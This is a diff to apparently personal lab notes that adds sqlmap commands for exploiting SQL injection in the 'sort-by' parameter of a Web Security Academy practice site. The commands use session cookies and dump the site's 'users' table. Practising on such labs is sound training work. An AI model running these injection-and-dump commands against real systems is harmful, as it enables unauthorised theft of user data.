@@ -19,3 +19,10 @@ sqlmap -u "https://0aa2002403285f85c21ed0d400d2002a.web-security-academy.net/fil
 sqlmap -u "https://0aa2002403285f85c21ed0d400d2002a.web-security-academy.net/filtered_search?SearchTerm=test&sort-by=*&writer=" --cookie="_lab=46%7cMCwCFFrmCdH%2bBPSw605SnnddEyaRrjopAhRsn1%2fdvu1nnAMhzcKEAJH09IxfZlDz3Dofj9NnU6tFPzLQg317TH7mFGDlqgDTPMw02ZCaxZU1TqUfHYOt3RWYdIftlywBAfU6j8vMHadxslfGMMV8AAQqAtwl4h1OoIT0csiE7NTxRsc%3d; session=wjXQ2Nk7b8OEJ97WK5eKqFqjcrsnyELD" --batch --random-agent -v --level=2 --tables
 
 sqlmap -u "https://0aa2002403285f85c21ed0d400d2002a.web-security-academy.net/filtered_search?SearchTerm=test&sort-by=*&writer=" --cookie="_lab=46%7cMCwCFFrmCdH%2bBPSw605SnnddEyaRrjopAhRsn1%2fdvu1nnAMhzcKEAJH09IxfZlDz3Dofj9NnU6tFPzLQg317TH7mFGDlqgDTPMw02ZCaxZU1TqUfHYOt3RWYdIftlywBAfU6j8vMHadxslfGMMV8AAQqAtwl4h1OoIT0csiE7NTxRsc%3d; session=wjXQ2Nk7b8OEJ97WK5eKqFqjcrsnyELD" --batch --random-agent -v --level=2 -T users --dump
+
+
+-u "https://0aa2002403285f85c21ed0d400d2002a.web-security-academy.net:443/filtered_search?SearchTerm=test&sort-by=*&writer=" --level=2 --technique=ETSB --cookie="_lab=46%7cMCwCFFrmCdH%2bBPSw605SnnddEyaRrjopAhRsn1%2fdvu1nnAMhzcKEAJH09IxfZlDz3Dofj9NnU6tFPzLQg317TH7mFGDlqgDTPMw02ZCaxZU1TqUfHYOt3RWYdIftlywBAfU6j8vMHadxslfGMMV8AAQqAtwl4h1OoIT0csiE7NTxRsc%3d;session=wjXQ2Nk7b8OEJ97WK5eKqFqjcrsnyELD" --batch --random-agent -v --level=2 -T users --dump
+
+
+
+-u "https://0aa2002403285f85c21ed0d400d2002a.web-security-academy.net:443/filtered_search?SearchTerm=test&sort-by=*&writer=" --level=2 --dbms="PostgreSQL" --technique=ETSB --cookie="_lab=46%7cMCwCFFrmCdH%2bBPSw605SnnddEyaRrjopAhRsn1%2fdvu1nnAMhzcKEAJH09IxfZlDz3Dofj9NnU6tFPzLQg317TH7mFGDlqgDTPMw02ZCaxZU1TqUfHYOt3RWYdIftlywBAfU6j8vMHadxslfGMMV8AAQqAtwl4h1OoIT0csiE7NTxRsc%3d;session=wjXQ2Nk7b8OEJ97WK5eKqFqjcrsnyELD" --batch --random-agent -v --level=2 -T users --dump
